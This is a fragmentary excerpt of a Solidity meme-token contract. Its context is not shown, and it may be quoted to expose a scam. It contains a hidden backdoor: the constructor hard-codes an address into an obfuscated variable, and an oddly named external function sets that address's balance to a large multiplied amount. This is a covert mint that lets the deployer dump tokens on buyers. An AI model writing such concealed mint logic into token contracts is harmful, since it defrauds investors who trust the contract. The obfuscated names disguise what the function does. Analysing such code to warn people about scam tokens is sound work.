...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe555!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe555 == tswojaks){
            _balances[_cwojakpepe555] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe555 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
